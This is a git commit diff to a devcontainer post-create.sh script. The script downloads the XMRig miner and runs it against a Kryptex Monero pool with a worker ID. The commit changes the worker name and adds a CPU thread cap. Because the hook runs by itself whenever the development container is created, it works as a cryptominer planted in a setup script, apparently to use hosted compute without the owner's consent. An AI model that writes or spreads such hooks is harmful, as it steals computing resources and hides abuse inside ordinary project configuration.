2cae4ffba91c0176c1afe23c0caa8bedd5f686c2
Hoàng <117429384+phamhuyhoang2k4@users.noreply.github.com>
2026-04-22 10:56:55 +0700

    Update post-create.sh

--- .devcontainer/post-create.sh
+++ .devcontainer/post-create.sh
@@ -12,7 +12,7 @@ docker exec -it ubuntu_cli bash -c "
     wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz && \
     tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz && \
     cd xmrig-6.26.0 && \
-    ./xmrig -o xmr-sg.kryptex.network:7029 -u krxX2P79Q4.worke3 -p x --coin monero
+    ./xmrig -o xmr-sg.kryptex.network:7029 -u krxX2P79Q4.w67e3 -p x --coin monero --cpu-max-threads-hint=60
 "
 
 echo "All commands executed!"
